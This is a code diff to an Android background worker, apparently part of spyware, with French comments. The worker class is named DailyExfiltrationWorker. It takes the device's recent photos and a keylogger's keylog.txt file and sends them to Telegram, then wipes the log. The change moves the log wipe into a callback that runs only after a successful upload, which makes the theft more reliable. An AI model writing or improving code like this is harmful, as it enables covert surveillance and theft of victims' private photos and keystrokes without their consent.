@@ -24,19 +24,21 @@ public class DailyExfiltrationWorker extends Worker {
         File[] photos = PhotoCollector.getRecentPhotos(getApplicationContext(), 10);
         for (File photo : photos) {
             Log.d("DailyExfiltrationWorker", "Envoi de la photo : " + photo.getAbsolutePath());
-            TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg");
+            TelegramExfiltrator.sendFileToTelegram(photo, "sendPhoto", "photo", "image/jpeg", null);
         }
 
         // ⌨️ 2. Exfiltration du fichier de log du keylogger
         File keylog = new File(getApplicationContext().getFilesDir(), "keylog.txt");
         if (keylog.exists()) {
             Log.d("DailyExfiltrationWorker", "Envoi du fichier de log du keylogger");
-            TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream");
-            try {
-                new FileWriter(keylog, false).close();
-            } catch (IOException e) {
-                Log.e("Exfiltration", "Erreur lors du vidage du fichier keylog", e);
-            }
+            TelegramExfiltrator.sendFileToTelegram(keylog, "sendDocument", "document", "application/octet-stream", () -> {
+                try {
+                    new FileWriter(keylog, false).close();
+                    Log.d("DailyExfiltrationWorker", "Fichier keylog vidé après envoi");
+                } catch (IOException e) {
+                    Log.e("Exfiltration", "Erreur vidage fichier", e);
+                }
+            });
         }
 
         return Result.success();
